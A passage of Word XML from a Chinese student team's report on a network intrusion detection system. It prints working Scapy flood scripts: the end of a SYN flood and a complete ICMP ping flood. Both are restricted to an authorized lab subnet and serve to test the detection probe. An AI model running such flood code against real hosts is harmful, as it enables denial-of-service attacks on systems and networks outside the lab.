        <w:t xml:space="preserve">        pace(args.rate, sent, started)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B82CCA6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[SYN] 完成，共发出 {sent} 个 SYN", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3599EBD7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A43DDE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60FA7100">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="089A6AC6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B9A7BDB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    raise SystemExit(main())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69860976">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E338A7A">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-13　attack/pingflood.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（43 行）　M7 ping 洪泛（仅限授权网段）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40147116">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""ICMP 洪泛复现（**仅限本人授权实验网段**）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254ECD3D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="194E1E07">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>用大尺寸 ICMP Echo 制造高带宽的单向流量，用来验证探针在高包速下的表现</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0814D6CD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>（流表淘汰、速率类特征失真）以及看板时序图能否立刻抬升。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD34796">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29ECA59E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E153581">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D94711F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24159B76">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABD4233">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30553382">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5E028E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC4AE75">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72EC1C71">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sys.path.insert(0, str(Path(__file__).resolve().parent.parent))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48DCC627">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from attack.common import add_common_args, guard, pace, require_root  # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1235BBE3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="074C0534">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="221F4243">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def main(argv=None) -&gt; int:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A070244">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap = argparse.ArgumentParser(description="ICMP 洪泛（仅限授权实验网段）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560A32B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    add_common_args(ap)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42DE1BD5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--size", type=int, default=1400, help="载荷字节数，上限 1472")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541B846F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    args = ap.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B1D410">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    guard(ap, args)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29B4972E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if args.size &gt; 1472:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F5596BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ap.error("--size 上限 1472（1500 MTU 减去 20 字节 IP 头与 8 字节 ICMP 头）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D865039">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    require_root()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025B9550">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D106170">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from scapy.all import ICMP, IP, send</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE36BA2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65F35C62">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    payload = b"A" * args.size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="533599E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    started = time.monotonic()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCC1791">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    sent = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F39992">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[PING] -&gt; {args.target}　载荷 {args.size}B　速率 {args.rate}/s", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C902F58">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    while time.monotonic() - started &lt; args.duration:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A5B4EC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        send(IP(dst=args.target) / ICMP() / payload, verbose=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D6E7EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sent += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47405729">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        pace(args.rate, sent, started)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43098C3B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[PING] 完成，共发出 {sent} 个包（约 {sent * args.size / 1e6:.1f} MB 载荷）", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21896F2A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6632EA69">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A310BC1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="264A6A58">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1FB6A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    raise SystemExit(main())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C071E4">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="626EDBB2">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.2.7 小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="600AFD87">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本部分交付了系统的骨架：探针能把帧变成带列序名的特征批次，中心能鉴权、落库、推理并把非 BENIGN 流升级成告警，攻击复现脚本能在授权网段内构造对照流量。骨架的价值在于“下游可以独立开发”：特征、模型、大模型、看板四块都在它之上并行完成，最终由本人在 3.6 节做端到端联调。未完成的部分是 M10 的双探针联调，原因写在 3.2.5 节，不掩饰。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="754C5701">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3.3 孙贤泽：特征工程、小模型与五模型对比（M2 / M3 / M8）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="288367BD">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本人负责“把一行特征变成一个有依据的类别”这一段：特征的构造与口径对齐、分类器的训练与在线封装、以及五个模型的同口径对比实验。这一段决定了系统的判断能力，也决定了报告里能写出什么样的数字。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21BBB752">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 3-4　本部分涉及的源文件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1134"/>
        <w:gridCol w:w="5102"/>
      </w:tblGrid>
      <w:tr w14:paraId="18EE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81" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="69FD28B6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5BBEB1E4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>行数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5102" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="16D265BC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>职责</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="0F132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vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="71F720BE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>probe/features.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7063FA45">
